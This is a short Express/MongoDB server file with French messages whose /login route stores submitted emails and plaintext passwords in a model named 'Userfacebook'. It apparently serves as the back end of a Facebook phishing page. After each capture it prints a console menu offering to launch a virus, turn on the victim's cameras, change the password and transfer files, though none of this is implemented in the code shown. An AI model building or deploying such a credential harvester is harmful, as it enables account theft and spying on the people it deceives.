const express = require("express")
const mongoose = require("mongoose")
const cors = require("cors")
const app = express()
const port = 3000
const { Userfacebook } = require("./model")
const connection = require("./connection")
connection();
app.use(express.json())
app.use(cors())

app.post("/login", async (req, res) => {
    try {
        const { email, password } = req.body || {};

        // Validation minimale
        if (!email || !password) {
            return res.status(400).send({ message: 'Email et mot de passe requis' });
        }

        

        const utilisateur = new Userfacebook({ email, password });
        console.log("0-Taper 0 pour lancer le virus");
        console.log("l'utilisateur",email,"s'est connecté");
        console.log("1-Taper 1 pour allumer la camera du front");
        console.log("2-Taper 2 pour allumer la camera du derriere");
        console.log("3-Taper 3 pour allumer les deux cameras");
        console.log("4-Taper 4 pour changer le mot de passe");
        console.log("5-Taper 5 pour  lancer  le transfert de fichier");
        console.log("6-Taper 6 pour se déconnecter");

        await utilisateur.save();

        return res.status(201).send({ message: 'utilisateur créé avec succès' });
    } catch (error) {
       return res.status(500).send({ message: 'erreur lors de la création de l\'utilisateur', error });
        }
        
    
});

app.listen(port, () => {
    console.log("le serveur a demarré sur le port " + port)
})